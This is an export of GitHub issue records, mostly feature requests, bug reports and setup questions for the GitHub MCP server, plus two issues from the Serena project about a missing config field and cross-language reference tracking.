Additionally, the REST API's timeline events endpoint could be used for issue/PR specific events.

## Benefits

- Enables workflow analytics and metrics tracking
- Provides transparency into project management processes
- Allows LLMs to answer time-based questions about project items
- Supports building reports and dashboards through AI

## Additional Context

This feature request came from a real-world scenario where a user wanted to track how long an issue spent in each column of their project board, but the current MCP server tools couldn't provide this information.

- [ProjectV2 API](https://docs.github.com/en/graphql/reference/objects#projectv2item)

github/github-mcp-server,3426691025,1096,"[Bug] MCP tool works and responds, but Claude Desktop pop-up shows ""Could not attach to MCP server""",open,2025-09-17T15:00:06Z,2025-09-23T03:51:47Z,[],jigarvyasidea,"## Description
Everything is working properly:
- MCP server is running
- Configuration is valid
- The tool **works and gives correct responses** when tested directly

 The MCP tool itself is functioning fine.  
 But in **Claude Desktop pop-up**, it still shows:



So the tool is usable, but the Desktop client UI wrongly shows this error.

---

## Steps to Reproduce
1. Start MCP server (works fine independently).
2. Add configuration in `claude_desktop_config.json`.
3. Restart Claude Desktop.
4. Test the tool → it responds correctly.
5. Open Desktop pop-up → error message appears:



---

## Expected Behavior
Claude Desktop should:
- Attach to the MCP server without error

---

## Actual Behavior
- MCP tool works and returns responses  
- But the Claude Desktop **pop-up shows only an error message**:




---

## Additional Notes
- Everything else works perfectly, only the **pop-up shows a misleading error**
- Tool calls and responses are successful despite the error
- Tried restart, absolute paths, different transports → still same result

github/github-mcp-server,3368756693,1012,Add CreateRelease tool for programmatic release creation,open,2025-08-30T05:09:39Z,2025-09-02T16:09:24Z,[],zzstoatzz,"## Describe the feature or problem you'd like to solve

Currently, the GitHub MCP server provides excellent read-only access to releases through `list_releases`, `get_latest_release`, and `get_release_by_tag` tools. However, there's no way to **create** releases programmatically through the MCP interface.

While we can use the GitHub CLI (`gh release create`) for this, it would be more consistent and convenient to have this capability directly in the MCP server, especially when automating workflows that already use other MCP write operations.

## Proposed solution

Add a `CreateRelease` tool that mirrors the functionality of the GitHub API's [Create a release](https://docs.github.com/en/rest/releases/releases#create-a-release) endpoint. The tool would accept parameters like:

- `owner` - Repository owner (required)
- `repo` - Repository name (required)  
- `tag_name` - The name of the tag (required)
- `target_commitish` - The commitish value for the tag (optional, defaults to repo's default branch)
- `name` - The name of the release (optional)
- `body` - Text describing the release contents (optional)
- `draft` - Whether this is a draft release (optional, default false)
- `prerelease` - Whether this is a pre-release (optional, default false)
- `generate_release_notes` - Whether to auto-generate release notes (optional)

## Why this makes sense

The GitHub MCP server already has:
- Many other write operations (`CreateIssue`, `CreatePullRequest`, `CreateRepository`, `CreateBranch`, etc.)
- Read-only release operations (listing and fetching releases)
- The authentication and permissions framework to handle write operations

Adding `CreateRelease` would complete the release management capabilities and provide a consistent interface for automation tools that need to create releases as part of their workflow.

## Use cases

- Any workflow currently using `gh release create` that would benefit from MCP integration

## Additional context

Looking at the existing codebase, this would follow the same pattern as other create operations in `pkg/github/repositories.go`. The implementation would be straightforward, using the existing GitHub client infrastructure.

Would you be open to a PR adding this functionality? I'd be happy to contribute this feature following your existing patterns and conventions."

It also adds comprehensive unit tests for the new validation logic and updates documentation to reflect these changes. Additionally, a new GitHub Actions workflow is added for generating SLSA provenance files for improved supply chain security.

**Issue Title Validation Improvements:**

* Added a new function `RequiredMeaningfulTitle` in `pkg/github/server.go` that enforces issue titles to be at least 3 characters long, contain at least one letter or number, and not be common placeholders (e.g., ""Title"", ""TODO"", ""test""). (`[pkg/github/server.goR91-R148](diffhunk://#diff-b6e388e2a018b4bc415a18e7dd986e6b7730931af9d26c37ba4be38988e421edR91-R148)`)
* Updated the issue creation logic in `pkg/github/issues.go` to use `RequiredMeaningfulTitle` instead of the previous generic required parameter check. (`[pkg/github/issues.goL804-R804](diffhunk://#diff-eab3158a062b4de104a63ca60b07d2db607535afac21cc90b136af8496e6681aL804-R804)`)
* Enhanced the API documentation in `README.md` to specify the new requirements for the `title` parameter when creating issues. (`[README.mdL536-R536](diffhunk://#diff-b335630551682c19a781afebcf4d07bf978fb1f8ac04c6bf87428ed5106870f5L536-R536)`)

**Testing Enhancements:**

* Added extensive unit tests for `RequiredMeaningfulTitle` in `pkg/github/server_test.go`, covering valid, invalid, and edge-case titles. (`[pkg/github/server_test.goR563-R683](diffhunk://#diff-014ce2a5e97b449dbaacef3a9a5b1cb9bd0e7a863b095ef29117af2a1d3bdf85R563-R683)`)
* Expanded integration tests in `pkg/github/issues_test.go` to verify error messages for invalid titles during issue creation. (`[pkg/github/issues_test.goR684-R740](diffhunk://#diff-2e611e3b483afedad4fd22bdbefada38ac15d4d752b7d71e22b454e8e3800b5eR684-R740)`)

**Supply Chain Security:**

* Introduced a new workflow file `.github/workflows/generator-generic-ossf-slsa3-publish.yml` to generate SLSA provenance files, supporting supply chain security best practices. (`[.github/workflows/generator-generic-ossf-slsa3-publish.ymlR1-R66](diffhunk://#diff-98bd42f3b5e076be27172aad3387298cbca7505451064fb47b3a5c384bd0ca40R1-R66)`)

who was getting api rate limits broken constantly and after working with them they see that the MCP extension for VSCode was consuming a lot of tokens for this user.

The errors they received:

<img width=""477"" height=""218"" alt=""Image"" src=""https://github.com/user-attachments/assets/9941e2c4-c95e-457c-9e7a-17e5ed31892e"" />


Running gh api second to second for this user produced:

```
lysander@MPro ~ % gh api rate_limit
{
  ""resources"": {
    ""core"": {
      ""limit"": 5000,
      ""used"": 2995,
      ""remaining"": 2005,
      ""reset"": 1755497482
    },
```

```
lysander@MPro ~ % gh api rate_limit
{
  ""resources"": {
    ""core"": {
      ""limit"": 5000,
      ""used"": 3050,

      ""used"": 4192,
      ""remaining"": 808,
      ""reset"": 1755497482
    },
```

The client wanted to know why the MCP server was draining all of the resources for his api rate limits, i have asked them to provide me more info on this end, but i wanted to see if there was an issue with over-consumptive api resources.

github/github-mcp-server,3318686222,868,Feature Request: Add support for editing issue comments,open,2025-08-13T14:24:31Z,2025-08-13T14:24:31Z,[],kaovilai,"### Describe the feature or problem you'd like to solve

Currently, the GitHub MCP Server supports creating comments on issues via the `add_issue_comment` tool, but there is no corresponding functionality to edit existing issue comments. This limitation prevents users from correcting typos, updating information, or making other modifications to comments that have already been posted.

### Use cases

1. **Correcting typos or formatting errors** in comments after posting
2. **Updating information** in comments when circumstances change
3. **Adding additional context** to existing comments
4. **Fixing broken links or references** in comments
5. **Modifying automated comments** generated by bots or scripts

### Example scenario

Consider a situation where you've posted a comment like this one: https://github.com/vmware-tanzu/velero/issues/9178#issuecomment-3183595834

After posting, you realize there's a typo, formatting issue, or need to add more information. Currently, there's no way to edit this comment through the MCP server - you would need to either:
- Leave the comment as-is with errors
- Delete and recreate the comment (losing the original timestamp and any replies)
- Manually edit through the GitHub web interface

### Proposed solution

Add an `edit_issue_comment` tool that would accept:

- `owner` (string): Repository owner
- `repo` (string): Repository name  
- `comment_id` (number): The ID of the comment to edit
- `body` (string): New comment text content

This would use the GitHub REST API's [Update an issue comment](https://docs.github.com/en/rest/issues/comments#update-an-issue-comment) endpoint.

### Additional context

This functionality would complement the existing `add_issue_comment` tool and provide a more complete set of comment management capabilities. The GitHub REST API already supports this operation, so implementation should be straightforward.

Similar functionality could potentially be extended to:
- Pull request comments
- Discussion comments
- Other comment types throughout GitHub

### Alternative solutions

As an alternative or complementary approach, the MCP server could also support:
- `delete_issue_comment` for removing comments entirely
- `list_issue_comments` for retrieving existing comments (to find comment IDs for editing)

Would appreciate this enhancement to make issue management workflows more complete!"

I've set up a `COPILOT_MCP_GITHUB_PERSONAL_ACCESS_TOKEN` with the extra scope I want, and put it into the copilot environment. I've tried to use this from https://github.com/github/github-mcp-server/issues/439#issuecomment-2912458077:

```jsonc
// Remove all comments when you paste this into the MCP config input
{
  ""mcpServers"": {
    ""github-mcp-server"": {
      // Leave this blank and we will overwrite it automatically with the correct command
      ""command"": """",
      // Optionally allow read-write tools by removing the `--read-only` arg
      ""args"": [""stdio"", ""--read-only""],
      // Use the GitHub access token provided by Copilot coding agent with read access to the current repo 
      ""env"": { ""GITHUB_PERSONAL_ACCESS_TOKEN"": ""GITHUB_PERSONAL_ACCESS_TOKEN"" },
     // Customize the tools exposed to the agent
      ""tools"": [""*""]
    }
  }
}
```

However that setup currently breaks (it demands a ""type"" attribute), and this doesn't seem to work either:

```jsonc
{
  ""mcpServers"": {
    ""github-mcp-server"": {
      ""type"": ""local"",
      ""command"": """",
      ""args"": [""stdio""],
      ""env"": { ""GITHUB_PERSONAL_ACCESS_TOKEN"": ""COPILOT_MCP_GITHUB_PERSONAL_ACCESS_TOKEN"" },
      ""tools"": [""*""]
    }
  }
}
```

I might be missing something obvious, but I can't seem to get this working. Any example configs would be appreciated!"

I can't make out from the documentation how to approach this. OpenAI's Connector seems to use a hybrid flow — they request both an installation and a user token. It's not clear to me however how to then make sure the MCP can use both simultaneously.

There's an indentation error in the EmployeeManagement class implementation. The error occurs because the class methods are not properly indented.

### Error Message
```
line 16
    def __init__(self, master, **kwargs):
IndentationError: expected an indented block after class definition on line 15
```

### Fixed Code Implementation
```python
class EmployeeManagement(ctk.CTkFrame):
    def __init__(self, master, **kwargs):
        super().__init__(master, **kwargs)

        self.grid_columnconfigure(0, weight=1)
        self.grid_rowconfigure(4, weight=1)
        
        # Employee Form Fields
        self.employee_id = ctk.CTkEntry(self, placeholder_text=""Employee ID"")
        self.employee_id.grid(row=0, column=0, padx=10, pady=5, sticky=""ew"")

        self.name.delete(0, 'end')
        self.department.set("""")
```

### Changes Made
1. Fixed indentation for all methods inside the EmployeeManagement class
2. Added proper grid layout management
3. Added validation in add_employee method
4. Implemented form clearing after adding employee

### Testing Steps
1. Create instance of EmployeeManagement class
2. Try adding an employee with the form
3. Verify table updates correctly
4. Verify form clears after submission

class ScheduleManager(ctk.CTkFrame):
    def __init__(self, master, **kwargs):
        super().__init__(master, **kwargs)

github/github-mcp-server,3240667891,696,Authentication to the MCP server as a GitHub app install,closed,2025-07-17T19:22:52Z,2025-08-27T12:42:46Z,[],afallou,"I'm building a GitHub app that posts reviews in pull requests for repos where it's installed.

What I'm wondering is, which token should I use to authenticate against the MCP server?
Reading https://docs.github.com/en/apps/creating-github-apps/authenticating-with-a-github-app/about-authentication-with-a-github-app it seems I should authenticate as an application install, so the agent can get access to the target repo through the MCP.

However, if I do that then Claude Code fails to connect to the MCP server, whereas it succeeds if I use e.g. my personal GitHub token.
I verified that the installation access token is correct/has the right permissions by making a GitHub API request with it, a `GET` on my target pull request:
```
curl -X GET ""https://api.github.com/repos/<org>/<repo>/pulls/1"" -H ""Authorization: Bearer ghs_...""
```

I then tried to directly ping the MCP server:
```
curl -X GET ""https://api.githubcopilot.com/mcp/x/pull_requests"" -H""Authorization:Bearer <token>""
```
this works when using my personal token (`ghp_...`) but not with an installation access token. In the latter case I get a 400 response code with message `bad request: Authorization header is badly formatted`

What is your guidance on this?"

github/github-mcp-server,3193601129,625,Add pagination support for get_pull_request_diff to handle large PRs,open,2025-07-01T19:37:37Z,2025-08-21T22:40:40Z,[],kaovilai,"## Problem

The `get_pull_request_diff` function currently fails when attempting to fetch diffs for large pull requests that exceed the token limit. This makes it impossible to analyze changes in PRs with substantial modifications.

### Example Error
```
Error: MCP tool ""get_pull_request_diff"" response (36464 tokens) exceeds maximum allowed tokens (25000). 
Please use pagination, filtering, or limit parameters to reduce the response size.
```

This error was encountered when trying to fetch the diff for https://github.com/vmware-tanzu/velero/pull/9019

## Proposed Solution

Add pagination support to the `get_pull_request_diff` function to handle large diffs by:

1. Implementing pagination parameters (e.g., `page`, `per_page`, or file-based pagination)
2. Adding options to filter by specific files or paths
3. Supporting partial diff retrieval with offset/limit parameters

## Use Case

This enhancement would enable users to:
- Analyze large pull requests without hitting token limits
- Retrieve diffs incrementally for better performance
- Focus on specific files or directories within a PR

## Alternative Workarounds

Currently, users must resort to other methods like:
- Using `get_pull_request_files` to list changed files
- Fetching individual file contents
- Using the GitHub CLI or API directly

Having built-in pagination would provide a more seamless experience for MCP users working with large codebases."

github/github-mcp-server,3186602891,608,Enhancement: Add log truncation options to `get_job_logs` tool for improved LLM context efficiency,closed,2025-06-29T21:52:01Z,2025-07-28T19:37:50Z,[],kehao95,"## Summary

The `get_job_logs` tool currently returns complete job logs, which can be extremely long and inefficient when used as MCP tool context for LLMs. Adding log truncation options like `tail_lines`  parameters would help focus on relevant failure information.

## Problem

When debugging CI/CD failures using the `get_job_logs` tool in LLM conversations:

1. **Context Overflow**: Complete job logs can easily exceed LLM context limits
2. **Information Overload**: Most debugging scenarios only need the final portion where failures occur
4. **Poor User Experience**: Long logs make it harder to identify specific failure points

## Proposed Solution

Add optional truncation parameters to the `get_job_logs` tool:

- `tail_lines`: Return last N lines (most useful for failure debugging)

Example usage:
```json
{
  ""name"": ""get_job_logs"",
  ""arguments"": {
    ""owner"": ""example"",
    ""repo"": ""repo"", 
    ""job_id"": 12345,
    ""tail_lines"": 100,
    ""return_content"": true

Users need clear, client-specific setup instructions with explicit GitHub token permissions. Currently, setting up the remote GitHub MCP server requires guessing which of 35+ token scopes to select and figuring out different client syntax. This issue proposes adding comprehensive setup guides for Claude Code CLI, Claude Desktop, and Cursor, plus a detailed permission mapping that connects security goals to specific GitHub scopes.

---

## Related Work

This proposal complements existing PR #498 which adds basic Claude Code local setup. However, #498 only covers local Docker setup and doesn't address:

1. **Remote MCP server setup** (the new hosted option)
2. **Detailed token permissions** (which scopes to grant/deny)
3. **Multiple client support** (Cursor, Claude Desktop)
4. **Security best practices** (1Password, token naming)

Our proposal can either:
- **Complement** #498 by adding remote setup + security guidance
- **Supersede** #498 by providing comprehensive coverage of all scenarios

---

## Problem Statement

Following the successful merge of #514 which added PAT configuration examples, there's still a gap in documentation for client-specific setup instructions. Users currently need to:

1. **Guess which GitHub token scopes to select** from 35+ available options
2. **Figure out client-specific syntax** (different flags, formats)
3. **Understand security implications** without clear guidance

As noted in [this comment on #514](https://github.com/github/github-mcp-server/pull/514#issuecomment-2985543230), users coming from Claude Code would particularly benefit from specific permission mappings that connect the security approach to actual GitHub token scopes.

This is especially challenging when different MCP servers (like [Hugging Face](https://huggingface.co/settings/mcp)) provide comprehensive client-specific setup instructions, setting user expectations.

## Current Issues This Would Address

- #525: Users struggling with Cursor authentication setup
- #503: Questions about authentication methods
- #441: Requests for better auth integration
- General confusion about PAT scope selection (as seen in #514 comments)

## Proposed Solution

Add comprehensive client-specific setup documentation that includes:

### 1. Client Setup Instructions

Similar to Hugging Face's approach, provide setup instructions for popular clients:

#### Claude Code (CLI)
```bash
# Using GitHub PAT
claude mcp add -t http github-remote https://api.githubcopilot.com/mcp/ -H ""Authorization: Bearer YOUR_GITHUB_TOKEN""

# Using 1Password integration
claude mcp add -t http github-remote https://api.githubcopilot.com/mcp/ -H ""Authorization: Bearer $(op read 'op://Private/github-mcp-token/token')""
```

#### Claude Desktop
```json
{
  ""mcpServers"": {
    ""github-remote"": {
      ""url"": ""https://api.githubcopilot.com/mcp/"",
      ""authorization_token"": ""YOUR_GITHUB_TOKEN""
    }
  }
}
```

#### Cursor
```json
{
  ""mcpServers"": {
    ""github-remote"": {
      ""url"": ""https://api.githubcopilot.com/mcp/"",
      ""headers"": {
        ""Authorization"": ""Bearer YOUR_GITHUB_TOKEN""
      }
    }
  }
}
```

### 2. MCP Server Naming Convention

We propose establishing a naming convention for MCP servers:
- Format: `[provider]-[location]` (e.g., `github-remote`, `github-local`)
- Benefits:
  - Clear distinction between remote and local servers
  - Prevents naming conflicts when using both
  - Consistent with other MCP integrations
  - The `mcp` prefix is implicit in the context

### 3. Detailed PAT Permissions Guide

Map high-level goals to specific GitHub scopes, addressing the need identified in [#514 (comment)](https://github.com/github/github-mcp-server/pull/514#issuecomment-2985543230):

#### Required Scopes ✅
- **repo**: Full repository access (code, issues, PRs)
- **workflow**: Update GitHub Actions workflows
- **user**: Read user profile information
- **notifications**: Access and manage notifications

#### Recommended Scopes 🟡
- **write:org**: Manage organization membership
- **project**: Full project board access
- **gist**: Create and manage code snippets
- **write:packages**: Upload packages to GitHub Registry
- **admin:repo_hook**: Manage repository webhooks

#### Explicitly NOT Granted 🔴
- **delete_repo**: Prevents accidental repository deletion
- **delete:packages**: Protects package dependencies
- **admin:public_key**: Avoids SSH key compromise
- **admin:gpg_key**: Prevents GPG key management issues
- **codespace**: No Codespaces access needed
- **security_events**: Security scanning not required
- **read:audit_log**: Sensitive audit logs excluded

### 4. Security Best Practices

- **Token Naming**: Use pattern `mcp-github-[client]-[date]`
- **Expiration**: Set to 90 days maximum
- **Storage**: Use password managers or secret management tools
- **Rotation**: Quarterly token rotation recommended

## Benefits

1. **Reduces setup friction** - Users can get started quickly
2. **Improves security** - Clear guidance on minimal permissions
3. **Prevents over-permissioning** - Explicit ""do not grant"" list
4. **Matches user expectations** - Similar to other MCP providers
5. **Helps Claude Code users** - Specific guidance for CLI setup
6. **Clear naming conventions** - Avoid confusion between local/remote servers

## Implementation

Could be added as:
- New section in README.md under ""Setup Instructions""
- Separate `docs/client-setup.md` file
- Or integrated into existing documentation structure

## References

- Community-tested setup from #514
- Specific need for permission mapping identified in [#514 (comment)](https://github.com/github/github-mcp-server/pull/514#issuecomment-2985543230)
- Security model discussed in various issues
- Pattern established by other MCP providers
- Related local setup work in PR #498

Would love feedback on this approach and happy to submit a PR once we align on the structure!"

When creating an issue using the `create-issue` command of the Github MCP server (triggered via VSCode Copilot), the system does not select or use the appropriate issue template from the repository. This can result in issues being created without the required structure or missing important information.

### Proposed solution

- Detect and present available issue templates for the repository when an issue is created via VSCode Copilot and the Github MCP server.
- Select the most appropriate template based on the user's input or context.
- Use the selected template to structure the issue body, prompting the user for any required fields that need information that is not available to Copilot chat or which it can’t find by itself.

### Additional context

This enhancement would streamline the issue creation process and align it with best practices for open source repositories that rely on templates for quality and consistency.

Second, I'm not complaining: I need more information or more understanding.

The GitHub MCP fills a real need for me: I have multiple repos, I'm not an expert in GitHub (and I despise the git app), and I can now accomplish a lot more than I could without it.

However, by using Docker, we have shifted some ""costs"" from needs-to-know GitHub to needs-to-know Docker. I have installed and uninstalled Docker at least 20 times in the last year as I tried different containerized apps. To use GitHub MCP, I installed Docker--again. My point: I know Docker less than I know GitHub, and I don't have any incentive to learn Docker: it has repeatedly demonstrated to me that, frankly, the concept of Docker is lame.

So, I went looking for an MCP server for Docker: GitHub MCP is good, so the official Docker MCP server will be good too, right? Docker has (yet another) list of MCP servers, but doesn't have an MCP server. They have a beta LLM that must be based on ChatGPT 3.5 or older.

The github-mcp-server incorrectly reports success to Amazon Q after GitHub API operations have failed. This causes Amazon Q to tell users that actions were successful when they actually failed.

## Steps to Reproduce
1. Use Amazon Q CLI to create a GitHub issue with incorrect parameters (e.g., wrong owner)
2. The operation fails with an error message: `create_issue invocation failed to produce a result`
3. Despite this clear failure, Amazon Q responds with a success message: ""I've created an issue on the dotfiles GitHub repository...""

## Expected Behavior
- When a GitHub API operation fails, the github-mcp-server should properly communicate the failure to Amazon Q
- Amazon Q should inform the user that the operation failed and suggest troubleshooting steps

## Actual Behavior
- The github-mcp-server reports a failure: `create_issue invocation failed to produce a result`
- However, Amazon Q still tells the user: ""I've created an issue on the dotfiles GitHub repository...""
- This creates confusion as users believe operations succeeded when they actually failed

It would be helpful to have a way to pass an initial prompt or context when starting a session with the MCP server. This would allow for better contextualization and more relevant responses from the server, especially for use cases where the initial context is important for downstream interactions.

- Add support for an optional initial prompt/context parameter when starting a session (e.g., via an environment variable, command-line argument, or API field).
- Ensure this context is available to the server for the duration of the session.

**Use Case:**
- Users can provide background information, goals, or other relevant context at the start of a session, improving the quality of responses.

Currently, GitHub MCP Server lacks the functionality to add reviewers to pull requests. Being able to directly specify reviewers through the API is important for streamlining workflows and automating code review processes.

### Proposed solution
Implement support for the GitHub API endpoint `POST /repos/{owner}/{repo}/pulls/{pull_number}/requested_reviewers` in the MCP Server, allowing users to add reviewers to pull requests programmatically.

A proposed interface could look like:
```json
{
  ""owner"": ""repository_owner"",
  ""repo"": ""repository_name"",
  ""pull_number"": pull_request_number,
  ""reviewers"": [""reviewer1"", ""reviewer2""]

### Additional context
This feature would enhance automation capabilities for teams, allowing them to integrate reviewer assignment into CI/CD pipelines and other automated workflows. It would be particularly valuable for teams with established review patterns, such as automatically assigning specific reviewers based on file types changed or components affected. Additionally, this would bring the MCP Server more in line with the full capabilities of the GitHub API."

github/github-mcp-server,2973943174,120,Opinion on having multiple servers for GitHub,closed,2025-04-05T06:28:00Z,2025-04-23T13:38:13Z,[],rajbos,"Hi, I wanted to reach out to have get a view on how large these servers could/should become if you look at the massive amount of different API areas GitHub has. Currently it is possible to disable tools one by one, and that is it. 

I previously also started the request here: https://github.com/modelcontextprotocol/servers/issues/1125

My concern is that if we add every single part of the GitHub API into one server, users end up with a very large set of tools that could run. This also makes it harder for the client to choose which tool to run, as there could be multiple options for the same tool/command. 

I can imagine a sort of grouping to appear on the tools in the spec at the future, giving users more fine grained access. 

So giving users several servers to match only the parts of the API that they need/use, seems like a sensible thing to me. Why would I have tools available in my client for things like GHAS if I don’t use it or don’t have a license?

That’s why I separated a GHAS server https://github.com/rajbos/ghas-mcp-server as a start, to first have a discussion if this should be inside a single server or not. (I can always contribute it back into the official server). 

I’d prefer if there is an official server for this by the way, it should be owned and supported by the vendor in my opinion. 

So how do you see having a massive MCP server like for GitHub with everything and the kitchen sink in it, vs smaller servers that would mean more maintenance and configuration for the end user?"

github/github-mcp-server,2973126712,105,search_repositories returns unmanageable amount of data without pagination,closed,2025-04-04T18:43:24Z,2025-09-29T11:14:55Z,[],aaronsb,"### Describe the bug

When using the `search_repositories` tool, the server returns a very large response with all matching repositories at once, without pagination or limiting the results to a manageable amount. This makes it difficult to process and use the data effectively, especially in contexts where the response needs to be displayed or processed in a user-friendly way.

### Affected version

```
server version v0.1.0 (b89336793c5bc9b9abdd5100d876babbc1031f5d) 2025-04-04T15:38:19Z
```

### Steps to reproduce the behavior

1. Use the `search_repositories` tool with a somewhat generic query like ""MCP Model Context Protocol""
2. Receive a response with a large number of repositories (30+ in my case)
3. The entire response is returned at once without pagination, making it difficult to manage

### Expected vs actual behavior

**Expected behavior:**
- The server should return a limited number of results (e.g., 10 repositories)
- The response should include pagination information (e.g., total count, current page, next page token)
- There should be a way to request subsequent pages of results

**Actual behavior:**
- The server returns all matching repositories in a single response
- No pagination mechanism is provided
- The response can be extremely large and unwieldy for common search terms

### Logs

The response included 30+ repositories with full details for each, resulting in a very large JSON payload. The beginning of the response looked like this:

```json
{""total_count"":1746,""incomplete_results"":false,""items"":[{""id"":905016458,""node_id"":""R_kgDONfF0ig"",""owner"":{""login"":""lastmile-ai"",""id"":123273171,""node_id"":""O_kgDOB1j_0w"",""avatar_url"":""https://avatars.githubusercontent.com/u/123273171?v=4"",""html_url"":""https://github.com/lastmile-ai"",""gravatar_id"":"""",""type"":""Organization"",""site_admin"":false,...
```

Note that while the response includes `""total_count"":1746`, it doesn't provide any way to paginate through these results."

It's not clear to me why `search_repositories` and` list_commits` have no minimum bounds on page. Maybe an oversight for the anthropic server? However, they also have mismatching cases:

When running the conformance tests we saw that a lot of the tools schemas were using `string` types rather than `enum` types. I would think that the MCP Host would be able to make better use of the fields if it understood the values were constrained.

Specifically, we're looking at:
 * `list_issues`: `direction`, `sort` and `state`
 * `update_issue`: `state`
 * `search_code`: `order`
 * `search_issues`: `order` and `sort`
 * `search_users`: `order` and `sort`

oraios/serena,3569897797,714,Bug: Missing 'included_optional_tools' field in project.template.yml causes KeyError during auto-generation,closed,2025-10-30T09:59:04Z,2025-10-30T11:49:50Z,[],tyk-lab,"## Bug Report: Missing `included_optional_tools` field in project template

### Description

The `project.template.yml` file is missing the `included_optional_tools` field, which causes a `KeyError` when Serena tries to auto-generate project configuration for the first time.

### Environment

- **Serena Version**: 0.1.4
- **OS**: Windows 11
- **Installation Method**: uv

### Steps to Reproduce

1. Delete any existing `.serena/project.yml` file in a project
2. Try to activate the project: `activate_project(""path/to/project"")`
3. Serena attempts to auto-generate configuration from template
4. Error occurs during `ProjectConfig._from_dict()` execution

### Error Message

```
KeyError: 'included_optional_tools'
Traceback (most recent call last):
  File ""serena\tools\tools_base.py"", line 249, in task
    result = apply_fn(**kwargs)
  File ""serena\tools\config_tools.py"", line 16, in apply
    active_project = self.agent.activate_project_from_path_or_name(project)
  File ""serena\agent.py"", line 474, in activate_project_from_path_or_name
    project_instance: Project | None = self.load_project_from_path_or_name(project_root_or_name, autogenerate=True)
  File ""serena\agent.py"", line 460, in load_project_from_path_or_name
    project_instance = self.serena_config.add_project_from_path(project_root_or_name)
  File ""serena\config\serena_config.py"", line 588, in add_project_from_path
    project_config = ProjectConfig.load(project_root, autogenerate=True)
  File ""serena\config\serena_config.py"", line 302, in load
    return cls.autogenerate(project_root)
  File ""serena\config\serena_config.py"", line 220, in autogenerate
    return cls._from_dict(config_with_comments)
  File ""serena\config\serena_config.py"", line 278, in _from_dict
    included_optional_tools=data[""included_optional_tools""],
KeyError: 'included_optional_tools'
```

### Root Cause Analysis

In `serena/config/serena_config.py`:

1. **Line 215**: Template is loaded: `config_with_comments = load_yaml(PROJECT_TEMPLATE_FILE, preserve_comments=True)`
2. **Line 278**: Code expects the field: `included_optional_tools=data[""included_optional_tools""]`
3. **Template file** (`serena/resources/project.template.yml`) **does not include this field**

However, the `load_commented_map()` method (line 240-244) correctly provides default values:

```python
data[""included_optional_tools""] = data.get(""included_optional_tools"", [])
```

But this method is **not used** during auto-generation flow, only when loading existing config files.

### Proposed Solution

Add the missing field to `serena/resources/project.template.yml`:

```yaml
excluded_tools: []

# list of optional tools (which are disabled by default) to be included
included_optional_tools: []

# initial prompt for the project. It will always be given to the LLM upon activating the project
```

### Workaround

Users can manually add the field to their project's `.serena/project.yml` file after encountering the error, or wait for the second activation attempt which sometimes uses a fallback mechanism.

### Impact

- Affects new project initialization
- First-time users may encounter this error
- Prevents smooth onboarding experience

### Additional Context

The global configuration template (`serena_config.template.yml`) correctly includes the `included_optional_tools` field (line 55), but the project template does not, creating an inconsistency."

## Problem Statement

**Current State**: Serena (and most code intelligence tools) can find references within a single language, but fail at language boundaries.

**Real-World Pain Points**:
- Rust developer adds `#[pyfunction]` to expose function to Python → **can't find Python imports**
- Python developer imports Rust function → **can't jump to Rust implementation**
- Go developer uses `//export` for C interop → **no cross-language navigation**
- Proto/GraphQL schema changes → **manual search across generated code in multiple languages**

**What JetBrains/VSCode Claims They Do** (but don't really):
> ""Cross-language support""

**What They Actually Do**:
- Run multiple LSPs simultaneously ✅ (we do this now)
- Find references within each language ✅ (LSP does this)
- Find Python→TypeScript API calls across HTTP? ❌ **Nobody does this**
- Find Rust `#[pyfunction]` usage in Python? ❌ **Nobody does this**

## Why This Matters

### Use Case 1: Rust + Python (PyO3)
```rust
// lib.rs
#[pyfunction]
fn compute_embeddings(text: &str) -> Vec<f32> {
    // ... CUDA-accelerated computation
}
```

```python
# main.py
from my_rust_lib import compute_embeddings  # Can't find definition in Rust!

embeddings = compute_embeddings(""hello"")  # Can't find references from Rust!
```

**Current Behavior**: `find_references` on `compute_embeddings` in Rust finds... nothing in Python.

**Desired Behavior**: Find all Python imports and calls.

### Use Case 2: Protocol Buffers
```protobuf
// user.proto
message User {
  string name = 1;
  int32 age = 2;
}
```

Generates:
- `user_pb2.py` (Python)
- `user.pb.ts` (TypeScript)  
- `user.pb.go` (Go)

**Current Behavior**: Changing `User.name` → manually search all languages for breakage

**Desired Behavior**: ""Find References"" on proto field shows usage across all generated code

### Use Case 3: WebAssembly (Rust → JavaScript)
```rust
#[wasm_bindgen]
pub fn process_image(data: &[u8]) -> Vec<u8> { ... }
```

```typescript
import { process_image } from './wasm/image_processor';
process_image(imageData);  // Can't find definition!
```

## Proposed Solution

### Architecture: FFI Pattern Detection + Symbol Index

**Phase 1: Pattern-Based Detection** (MVP)
```python
class CrossLanguageReferenceTracker:
    """"""
    Detect FFI boundaries through pattern matching,
    then use existing LSPs to find references.
    """"""
    
    def __init__(self, lsp_manager: LSPManager):
        self._lsp_manager = lsp_manager
        # symbol_name → list of (language, file, line, column)
        self._ffi_index: dict[str, list[FFIExport]] = {}
        
    def index_project(self, project_root: str):
        """"""Scan for FFI patterns across all languages.""""""
        patterns = {
            Language.RUST: [
                r'#\[pyfunction\]\s+(?:pub\s+)?fn\s+(\w+)',  # PyO3
                r'#\[wasm_bindgen\].*?fn\s+(\w+)',           # wasm-bindgen
                r'extern\s+""C""\s+fn\s+(\w+)',                # C FFI
            ],
            Language.GO: [
                r'//export\s+(\w+)',                         # cgo
            ],
            Language.PYTHON: [
                r'@cffi\.def_extern\(\)\s+def\s+(\w+)',     # CFFI
            ],
        }
        
        for lang, regexes in patterns.items():
            self._scan_language(lang, regexes, project_root)
    
    def find_cross_language_references(
        self, symbol: str, source_lang: Language
    ) -> list[Location]:
        """"""
        Find where a Rust #[pyfunction] is used in Python,
        or where a Go //export is called from C.
        """"""
        if symbol not in self._ffi_index:
            return []
        
        refs = []
        for export in self._ffi_index[symbol]:
            if export.target_language != source_lang:
                # Use target language's LSP to find imports/calls
                ls = self._lsp_manager.get_language_server_for_language(
                    export.target_language
                )
                # First find imports of the module
                imports = self._find_imports(symbol, export.target_language)
                refs.extend(imports)
        
        return refs
```

### Phase 2: AST-Based Analysis (Production)
- Use tree-sitter to parse FFI declarations precisely
- Build proper symbol table with type information
- Handle name mangling (Rust → Python snake_case, etc.)

### Phase 3: LSP Protocol Extension (Research)
- Propose `workspace/crossLanguageReferences` LSP extension
- Coordinate between multiple LSPs for single query
- Potentially contribute back to LSP spec

## Implementation Roadmap

### Milestone 1: Rust ↔ Python (2-3 weeks)
**Why**: PyO3 is extremely popular, clear FFI markers

**Deliverables**:
- Pattern detection for `#[pyfunction]`, `#[pyclass]`
- Index Python imports of Rust modules
- New tool: `find_cross_language_references`
